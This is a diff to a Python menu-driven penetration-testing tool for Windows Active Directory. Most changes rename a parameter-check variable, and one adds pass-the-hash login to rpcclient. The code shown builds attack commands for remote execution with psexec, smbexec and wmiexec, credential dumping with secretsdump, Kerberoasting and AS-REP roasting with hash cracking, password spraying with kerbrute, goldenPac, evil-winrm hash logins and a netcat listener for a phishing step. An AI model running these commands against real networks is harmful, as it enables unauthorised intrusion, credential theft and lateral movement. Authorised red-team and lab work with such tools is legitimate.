@@ -566,23 +566,23 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='0':   
-      CheckParams = 0
+      checkParams = 0
 
       if (TIP[:5] == "EMPTY"):
          print("[-] Remote IP address not specified...")
-         CheckParams = 1
+#         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
          line1 = linecache.getline("lsaquery.tmp", 1)
          
          if (line1[:6] == "Cannot") or (line1[:1] == "") or "ACCESS_DENIED" in line1:
             print(colored("[!] WARNING!!! - Unable to connect to RPC data...",'red'))
-            CheckParams = 1
+            checkParams = 1
          else:
             print("[*] Attempting to enumerate domain name...")
             
-      if CheckParams != 1:
+      if checkParams != 1:
          DOM = " "*COL1					# WE HAVE CONNECTION SO
          SID = " "*COL1					# WIPE CLEAN CURRENT VALUES
          try:
@@ -590,7 +590,7 @@ while True:
          except ValueError:
             DOM = "EMPTY"
             
-      if CheckParams != 1:                  
+      if checkParams != 1:                  
          DOM = DOM.strip(" ")					# CLEAN UP DATA
          if len(DOM) < COL1: DOM = padding(DOM, COL1)
                   
@@ -1029,25 +1029,25 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '15':
-      CheckParams = 0
+      checkParams = 0
 
       if (DOM[:5] == "EMPTY"):
          print("\n[-] Domain name not specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
       if USR[:2] == "''":
          print("\n[-] Username has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
       if PAS[:2] == "''":
          print("\n[-] Password has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command("adidnsdump -u '" + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + DOM.rstrip(" ") + " --include-tombstoned -r")
          command("sed -i '1d' records.csv")
          command("\ncat records.csv")
@@ -1111,17 +1111,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '18':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command("nmap " + IP46 + " --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
       prompt()
 
@@ -1173,17 +1173,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='21':
-      CheckParams = 0
+      checkParams = 0
       
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command(keypath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -target " + TIP.rstrip(" "))
       prompt()
 
@@ -1196,17 +1196,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='22':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command(keypath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " list")
       prompt()
 
@@ -1219,17 +1219,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '23':
-      CheckParams = 0
+      checkParams = 0
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command(keypath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " whoami /all")
       prompt()
 
@@ -1242,17 +1242,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '24':
-      CheckParams = 0
+      checkParams = 0
 
       if TIP[:5] == "EMPTY":
          print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
-      if CheckParams != 1:
+      if checkParams != 1:
          command(keypath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
       prompt()
 
@@ -1265,17 +1265,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '25':
-      CheckParams = 0
+      checkParams = 0
       
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
-      if CheckParams != 1:
+      if checkParams != 1:
          if USR.rstrip(" ") != "Administrator":
             command(keypath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
       prompt()
@@ -1289,17 +1289,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '26':
-      CheckParams = 0
+      checkParams = 0
       
       if TIP[:5] == "EMPTY":
          print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command(keypath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
 
@@ -1312,17 +1312,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '27':
-      CheckParams = 0
+      checkParams = 0
       
       if TIP[:5] == "EMPTY":
          print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command(keypath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
 
@@ -1380,17 +1380,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='31':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command(keypath + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
       prompt()
 
@@ -1403,17 +1403,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          print("[*] Enumerating, please wait....")
          command(keypath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > DOMAIN.tmp")         
          
@@ -1489,17 +1489,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='33':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          print("[*] Enumerating users, please wait this can take sometime...\n")
          os.remove("usernames.txt")					# DELETE CURRENT VERSION
          command("touch usernames.txt")					# CREATE EMPTY NEW ONE
@@ -1542,17 +1542,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='34':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command(keypath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
       prompt()
       
@@ -1565,17 +1565,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='35':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command(keypath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()
       
@@ -1588,18 +1588,22 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '36':
-      CheckParams = 0
+      checkParams = 0
+      
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
+      if checkParams != 1:
+         if NTM[:5] == "EMPTY":
+            command("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
+         else:
+            print("[*] Using the HASH value as a login credential...\n")
+            command("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ")) 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1611,14 +1615,14 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='37':
-      CheckParams = 0
+      checkParams = 0
       
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
       if PAS != '':
-         if CheckParams != 1:
+         if checkParams != 1:
             os.remove("shares.txt")
             command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares.txt")
          
@@ -1660,17 +1664,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '38':
-      CheckParams = 0
+      checkParams = 0
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
       if ":" in TIP.rstrip(" "):
          print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
-         CheckParams = 1
+#         checkParams = 1
       
-      if CheckParams != 1:
+      if checkParams != 1:
          if DOM[:5] == "EMPTY":
             print("")
             command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + " -R")
@@ -1703,17 +1707,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '40':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command(keypath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
       prompt()
 
@@ -1726,17 +1730,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      CheckParams = 0
+      checkParams = 0
       
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          print("[*] Enumerating, please wait...")
          command("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")
          
@@ -1828,17 +1832,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
-      CheckParams = 0
+      checkParams = 0
       
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          found = 0
          print("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
          command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile bpassword1.tmp")
@@ -1890,17 +1894,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '43':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          if linecache.getline('usernames.txt', 1) != " ":
             command(keypath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
             print("[*] Cracking hash values if they exists...\n")
@@ -1919,17 +1923,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='44':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          if linecache.getline('usernames.txt', 1) != " ":
             command(keypath + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
             print("[*] Cracking hash values if they exists...\n")
@@ -2053,17 +2057,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '48':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + "...\n")
 
          if (NTM[:1] != "") & (SID[:1] != ""):
@@ -2089,17 +2093,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '49':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + "...\n")
 
          if (NTM[:1] != "") & (SID[:1] != ""):
@@ -2124,17 +2128,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='50':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + "...\n")
          command(keypath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
       prompt()
@@ -2148,17 +2152,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='51':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
          print("[*] Checking downloaded files: \n")
          command("ls -la ./" + DIR.rstrip(" "))
@@ -2173,13 +2177,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='52':
-      CheckParams = 0
+      checkParams = 0
       
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
       
-      if CheckParams != 1:
+      if checkParams != 1:
          print ("[*] Enumerating, please wait...")     
          if PAS[:2] != "''":
             command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
@@ -2196,17 +2200,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          BH1 = input("[+] Enter Neo4j username: ")
          BH2 = input("[+] Enter Neo4j password: ")
          if BH1 != "" and BH2 != "":
@@ -2224,17 +2228,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='54':
-      CheckParams = 0
+      checkParams = 0
       
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          print("Enumerating, please wait...\n")
          if PAS[:2] != "''":
             command(keypath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
@@ -2295,13 +2299,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='55':
-      CheckParams = 0
+      checkParams = 0
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          if PAS[:2] != "''":
             print("[*] Enumerating, please wait...")
             print("[+] Other exploitable machines on the same subnet...\n")
@@ -2343,17 +2347,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='56':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
          command(keypath + "psexec.py -hashes :" + NTM.rstrip("\n") + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass")
       prompt()
@@ -2367,17 +2371,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='57':
-      CheckParams = 0
+      checkParams = 0
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
          command(keypath + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
       prompt()
@@ -2391,17 +2395,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='58':
-      CheckParams = 0
+      checkParams = 0
       
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if CheckParams != 1:
+      if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
          command(keypath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()     
@@ -2415,7 +2419,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='59':
-      CheckParams = 0
+      checkParams = 0
       
       print("[*] Checking work folder for relevant files...")
 
@@ -2423,21 +2427,21 @@ while True:
          print("[+] File ntds.dit found...")
       else:
          print("[-] File ntds.dit not found...")
-         CheckParams = 1
+         checkParams = 1
          
       if os.path.exists("./" + DIR.rstrip(" ") + "/SYSTEM"):
          print("[+] File SYSTEM found...")
       else:
          print("[-] File SYSTEM not found...")
-         CheckParams = 1         
+         checkParams = 1         
 
       if os.path.exists("./" + DIR.rstrip(" ") + "/SECURITY"):
          print("[+] File SECURITY found...")
       else:
          print("[-] File SECURITY not found")
-         CheckParams = 1       
+         checkParams = 1       
          
-      if CheckParams != 1:
+      if checkParams != 1:
          print("[*] Extracting secrets, please wait...")
          command(keypath + "secretsdump.py -ntds ./" + DIR.rstrip(" ") + "/ntds.dit -system ./" + DIR.rstrip(" ") +  "/SYSTEM -security ./" + DIR.rstrip(" ") + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + DIR.rstrip(" ") +  "/ntlm-extract > log.tmp")
          
@@ -2485,13 +2489,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='61':
-      CheckParams = 0
+      checkParams = 0
    
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1   
+         checkParams = 1   
    
-      if CheckParams != 1:
+      if checkParams != 1:
          if WEB[:1] != "":
             command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + WEB.rstrip(" ") + " 2>&1")
             print("[+] User list generated via website...")
@@ -2520,13 +2524,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='62':
-      CheckParams = 0  
+      checkParams = 0  
    
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1   
+         checkParams = 1   
       
-      if CheckParams != 1:
+      if checkParams != 1:
          if WEB[:1] != "":
             command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write passwords.txt " + WEB.rstrip(" ") + " 2>&1")
             print("[+] Password list generated via website...")
@@ -2613,21 +2617,21 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='67':
-      CheckParams = 0   
+      checkParams = 0   
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
       if DOM[:5] == "EMPTY":
          print("[-] Remote mail.server has not been specified...")
-         CheckParams = 1
+         checkParams = 1
       
       if "25" not in POR:
          print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour4))
-         CheckParams = 1
+         checkParams = 1
          
-      if CheckParams != 1:
+      if checkParams != 1:
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'Go Phishing'; xdotool key Return; sleep 2")
          command("xdotool type 'nc -nvlp 80'; xdotool key Return")
@@ -2723,17 +2727,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='69':
-      CheckParams = 0
+      checkParams = 0
       
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
       if ":" in TIP:
          print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
-         CheckParams = 1         
+         checkParams = 1         
          
-      if CheckParams != 1:
+      if checkParams != 1:
          if WEB[:5] != "EMPTY":
             command("nikto -h " + WEB.rstrip(" "))
          else:
@@ -2749,13 +2753,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='70':
-      CheckParams = 0   
+      checkParams = 0   
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
-      if CheckParams != 1:
+      if checkParams != 1:
          if os.path.getsize("usernames.txt") == 0:
             print("[-] Username file is empty...")
             if USER[:1] != "'":
@@ -2794,13 +2798,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='71':
-      CheckParams = 0   
+      checkParams = 0   
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
-      if CheckParams != 1:
+      if checkParams != 1:
          if os.path.getsize("usernames.txt") == 0:
             print("[-] Username file is empty...")
             if USER[:1] != "'":
@@ -2839,13 +2843,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='72':
-      CheckParams = 0   
+      checkParams = 0   
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
-      if CheckParams != 1:
+      if checkParams != 1:
          if os.path.getsize("usernames.txt") == 0:
             print("[-] Username file is empty...")
             if USER[:1] != "'":
@@ -2884,13 +2888,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='73':
-      CheckParams = 0   
+      checkParams = 0   
 
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
-      if CheckParams != 1:
+      if checkParams != 1:
          if os.path.getsize("usernames.txt") == 0:
             print("[-] Username file is empty...")
             if USER[:1] != "'":
@@ -3169,16 +3173,16 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='88':
-      CheckParams = 0      
+      checkParams = 0      
       if TIP[:5] == "EMPTY":
          print("[-] Remote IP has not been specified...")
-         CheckParams = 1
+         checkParams = 1
          
       if PAS.rstrip(" ") == "''":
          print("[-] Password has not been specified...")
-         CheckParams = 1   
+         checkParams = 1   
    
-      if CheckParams == 1:
+      if checkParams == 1:
          if (NTM[:5] != "EMPTY") and (TIP[:5] != "EMPTY"):      
             print("[*] Using the HASH value as a login credential...")
             command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "'")
@@ -3186,7 +3190,7 @@ while True:
             if (NTM[:5] == "EMPTY") or (NTM[:1] == "."):
                print("[-] Hash value has not been specified...")
                     
-      if CheckParams == 0:
+      if checkParams == 0:
          command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "'")
       prompt() 
                  
